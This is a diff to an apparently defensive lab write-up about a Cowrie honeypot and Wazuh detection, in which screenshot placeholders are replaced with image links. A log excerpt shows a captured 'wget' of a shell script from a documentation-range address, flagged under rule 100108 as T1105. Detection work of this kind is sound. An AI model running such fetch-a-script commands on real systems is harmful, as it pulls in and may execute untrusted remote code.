@@ -29,7 +29,7 @@ If the download actually completes, Cowrie also writes a separate
 second event did not appear, because the documentation address does not serve
 anything, which is the honest outcome and exactly what I expected.
 
-_[screenshot: the wget command in cowrie.json]_
+![The wget command captured in cowrie.json](../screenshots/07-cowrie-commands.png)
 
 ## How Wazuh caught it
 
@@ -55,7 +55,7 @@ fired, which lines up with the download never completing:
 20:27:49  rule 100108  level 10  wget http://203.0.113.10/x.sh   T1105
 ```
 
-_[screenshot: the download attempt alert in Wazuh]_
+![The download-attempt alert in Wazuh: rule 100108, tagged T1105](../screenshots/08-download-alert.png)
 
 ## MITRE ATT&CK
 
